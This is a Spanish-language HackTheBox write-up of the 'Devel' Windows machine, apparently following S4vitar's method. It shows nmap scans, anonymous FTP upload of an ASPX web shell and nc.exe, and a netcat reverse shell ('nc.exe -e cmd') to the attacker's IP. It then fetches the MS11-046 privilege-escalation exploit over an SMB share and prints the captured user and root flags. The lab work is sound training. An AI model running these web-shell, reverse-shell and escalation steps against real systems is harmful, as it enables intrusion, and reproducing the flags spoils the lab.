# WriteUp HackTheBox Devel

[Nota]: esta maquina fue realizada según el WriteUp realizado por S4vitar

## Descripción de la máquina

![Devel_Image](Images/Devel.png)

La resolución de la máquina presenta las siguiente fases:

* Reconocimiento
    * nmap
* Explotación
* Escalada de privilegios

## Fase de Reconocimiento

Se realiza una prueba de ping para confirmar que haya conexión con la máquina

```console
ping 10.10.10.5 -c1
```

```
PING 10.10.10.5 (10.10.10.5) 56(84) bytes of data.
64 bytes from 10.10.10.5: icmp_seq=1 ttl=127 time=137 ms

--- 10.10.10.5 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 136.552/136.552/136.552/0.000 ms
```

Para identificar el sistema operativo usamos la utilidad proporcionada por S4vitar whichSystem.py[^1]

[^1]: la utilidad se puede descargar de <https://github.com/Akronox/WichSystem.py>

```console
whichSystem.py 10.10.10.5
```

```
10.10.10.5 (ttl -> 127): Windows
```

Se realiza una revisión de puertos con nmap con las siguientes opciones

* -p-: Para realizar el escaneo en todos los 65000 puertos TCP
* --open: Para reportar solamente los puertos que se encuentran abiertos
* -sS: TCP SYN port scan, este argumento se utiliza para realizar un escaneo rapido de puertos
* --min-rate: El argumento le exige a nmap realizar el escaneo con una tasa de paquetes por segundo no menor a la solicitada
* -vvv: triple verbose para mostrar más información
* -n: para que no realice resolución dns en el scaneo
* -Pn: Desabilita el descubrimiento del host a traves de ping
* -oG: exporta lo reportado en un archivo en formato grepeable

```console
sudo nmap -p- --open -sS --min-rate 5000 -vvv -Pn 10.10.10.5 -oG nmap/allPorts
```

```
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 10:48 -04
Initiating Parallel DNS resolution of 1 host. at 10:48
Completed Parallel DNS resolution of 1 host. at 10:48, 0.10s elapsed
DNS resolution of 1 IPs took 0.10s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating SYN Stealth Scan at 10:48
Scanning 10.10.10.5 [65535 ports]
Discovered open port 80/tcp on 10.10.10.5
Discovered open port 21/tcp on 10.10.10.5
Completed SYN Stealth Scan at 10:48, 26.40s elapsed (65535 total ports)
Nmap scan report for 10.10.10.5
Host is up, received user-set (0.14s latency).
Scanned at 2022-08-30 10:48:14 -04 for 26s
Not shown: 65533 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack ttl 127
80/tcp open  http    syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.62 seconds
           Raw packets sent: 131086 (5.768MB) | Rcvd: 20 (880B)
```

Por comodidad usamos la utilidad proporcionada por S4vitar extractPorts la cual nos ayuda a revisar el archivo creado por nmap 'all Ports' y nos copia los puertos en la clipboard para su posterior uso; se adjunta la utilidad a continuación

```console
extractPorts () {
        ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
        ip_address="$(cat $1 | grep -oP '\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}' | sort -u | head -n 1)"
        echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
        echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
        echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
        echo $ports | tr -d '\n' | xclip -sel clip
        echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
        /bin/bat extractPorts.tmp
        rm extractPorts.tmp

```

Ejecutamos el comando extractPorts

```console
extractPorts nmap/allPorts
```

```
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.5
   5   │     [*] Open ports: 21,80
   6   │ 
   7   │ [*] Ports copied to clipboard
   8   │ 
```

Se realiza un nuevo escaneo con una serie de scripts básicos que nmap nos ofrece para ver las técnologias que corren por detrás

```console
nmap -sCV -p21,80  10.10.10.5 -oN nmap/targeted 
```

```
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-30 10:49 -04
Nmap scan report for 10.10.10.5
Host is up (0.14s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
|_03-17-17  05:37PM               184946 welcome.png
| ftp-syst: 
|_  SYST: Windows_NT
80/tcp open  http    Microsoft IIS httpd 7.5
|_http-server-header: Microsoft-IIS/7.5
|_http-title: IIS7
| http-methods: 
|_  Potentially risky methods: TRACE
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.01 seconds
```

en el escaneo por nmap vemos que el usuario anonimo 'ftp-anon' está habilitado en la máquina, por tanto ingresamos al servidor por ftp

```console
ftp 10.10.10.5
```

```
Connected to 10.10.10.5.
220 Microsoft FTP Service
Name (10.10.10.5:mzapata): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> 
```

vemos algunos archivos que que se pueden ver desde el servidor web

```console
ftp> dir
```

```
200 PORT command successful.
125 Data connection already open; Transfer starting.
03-18-17  02:06AM       <DIR>          aspnet_client
03-17-17  05:37PM                  689 iisstart.htm
03-17-17  05:37PM               184946 welcome.png
226 Transfer complete.
ftp> 
```

![web-serber](Images/imagen01.png)

Revisamos si podemos subir archivos y leerlos en la maquina victima

```console
echo "Maquina Pwned" > prueba.txt
```

```console
ftp> put prueba.txt
```
```
local: prueba.txt remote: prueba.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
15 bytes sent in 0.00 secs (325.5208 kB/s)
```

![subida-archivos](Images/imagen02.png)

Probamos subir el archivo */usr/share/davtest/backdoors/aspx_cmd.aspx*

```console
ftp> put aspx_cmd.aspx
```

```
local: aspx_cmd.aspx remote: aspx_cmd.aspx
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
1438 bytes sent in 0.00 secs (16.9307 MB/s)
```

![upload-aspx-cmd](Images/imagen03.png)

Vemos que tenemos ejecución remota de comandos y que nos encontramos en la maquina victima

![RCE-aspx](Images/imagen04.png) 

Por tanto nos movemos el siguiente archivo al servidor */usr/share/SecLists/Web-Shells/FuzzDB/nc.exe*

```console
ftp> put nc.exe
```

```
local: nc.exe remote: nc.exe
200 PORT command successful.
150 Opening ASCII mode data connection.
226 Transfer complete.
28306 bytes sent in 0.00 secs (35.7546 MB/s)
```

revisamos si desde el *cmd.aspx* tenemos acceso a la carpeta

![dir-inetpub](Images/imagen05.png)

Por tanto corremo el nc desde el serverpara darnos una consola interactiva a nuestra maquina

```console
sudo nc -nrlp 443
```

```console
C:\inetpub\wwwroot\nc.exe -e cmd 10.10.14.3 443
```

![nc-aspx](Images/imagen06.png)

una vez dentro la maquina vemos el *sisteminfo*

```console
c:\Users>systeminfo
```

```
systeminfo

Host Name:                 DEVEL
OS Name:                   Microsoft Windows 7 Enterprise 
OS Version:                6.1.7600 N/A Build 7600
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Workstation
OS Build Type:             Multiprocessor Free
Registered Owner:          babis
Registered Organization:   
Product ID:                55041-051-0948536-86302
Original Install Date:     17/3/2017, 4:17:31 ��
System Boot Time:          30/8/2022, 5:39:09 ��
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x64 Family 6 Model 85 Stepping 7 GenuineIntel ~2294 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 12/12/2018
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             el;Greek
Input Locale:              en-us;English (United States)
Time Zone:                 (UTC+02:00) Athens, Bucharest, Istanbul
Total Physical Memory:     3.071 MB
Available Physical Memory: 2.473 MB
Virtual Memory: Max Size:  6.141 MB
Virtual Memory: Available: 5.548 MB
Virtual Memory: In Use:    593 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 N/A
Network Card(s):           1 NIC(s) Installed.
                           [01]: vmxnet3 Ethernet Adapter
                                 Connection Name: Local Area Connection 3
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.5
                                 [02]: fe80::58c0:f1cf:abc6:bb9e
                                 [03]: dead:beef::dd96:d4cb:3357:f4c
                                 [04]: dead:beef::58c0:f1cf:abc6:bb9e
```

Vemos que la versión de windows es bastante antigua *6.1.7600 N/A Build 7600* y que tienen un exploit llamado

Nos dscargamos el exploit de <>

nos compartimos el archivo con smbserver

```console
impacket-smbserver smbFolder $(pwd)
```

```
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
[*] Incoming connection (10.10.10.5,49159)
[*] AUTHENTICATE_MESSAGE (\,DEVEL)
[*] User DEVEL\ authenticated successfully
[*] :::00::aaaaaaaaaaaaaaaa
[-] Unknown level for query path info! 0x109
```

```console
C:\Windows\Temp\priv> copy \\10.10.14.3\smbFolder\ms11-046.exe ms11-046.exe
```

```
1 file(s) copied.
```

lo ejecutamos y ya tenemos acceso de Administrador

y podemos leer la falg de usuario y la flag de root

```console
C:\Users>type C:\Users\babis\Desktop\user.txt   
```

```
63356f5c1d235f27901d33c055dede4e
```

```console
C:\Users>type C:\Users\Administrator\Desktop\root.txt
```

```
e4192010829db35ce3cf92713a4e5093
```

## Estructura del directorio

```
Devel
├── content
│   ├── aspx_cmd.aspx
│   └── nc.exe
├── exploits
│   └── ms11-046.exe
├── Images
│   └── Devel.png
├── nmap
│   ├── allPorts
│   └── targeted
├── Readme.md
└── scripts
```


